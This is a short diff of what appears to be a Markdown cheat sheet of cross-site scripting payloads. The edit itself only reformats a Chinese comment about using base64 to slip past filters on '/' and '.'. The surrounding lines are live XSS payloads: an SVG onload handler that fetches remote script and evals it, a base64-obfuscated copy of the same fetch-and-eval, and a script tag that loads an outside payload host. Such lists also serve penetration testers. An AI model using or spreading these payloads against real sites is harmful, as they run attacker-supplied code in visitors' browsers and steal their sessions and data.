@@ -290,7 +290,7 @@ Form payload
 
 ```html
 <svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
-//结合base64绕过`/`和`.`过滤
+// 结合base64绕过/和.过滤
 <svg onload='eval(atob("ZmV0Y2goIi8vMTI3LjAuMC4xLzEuanMiKS50aGVuKHI9PnIudGV4dCgpLnRoZW4odD0+ZXZhbCh0KSkp"))'>
 <script src=14.rs>
 // you can also specify an arbitrary payload with 14.rs/#payload
